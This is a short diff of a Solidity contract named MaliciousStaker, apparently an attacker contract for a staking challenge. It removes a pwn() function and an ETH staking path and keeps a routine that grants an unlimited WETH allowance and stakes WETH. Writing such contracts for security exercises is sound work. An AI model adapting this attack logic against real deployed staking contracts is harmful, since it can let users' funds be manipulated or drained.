@@ -6,8 +6,7 @@
 pragma solidity ^0.8.0;
 
 interface Stake {
-    function StakeETH() public payable;
-    function StakeWETH(uint256 amount) public returns (bool);
+    function StakeWETH(uint256 amount) external returns (bool);
 }
 
 interface IWETH {
@@ -26,17 +25,8 @@ contract MaliciousStaker {
         i_weth = _weth;
     }
 
-    function pwn() external {
-        stakeWETH();
-        stakeETH();
-    }
-
     function stakeWETH() private {
         i_weth.approve(address(i_stake), type(uint256).max);
         i_stake.StakeWETH(defaultStake);
     }
-
-    function stakeETH() private {
-        i_stake.StakeETH{value: defaultStake}();
-    } 
 }
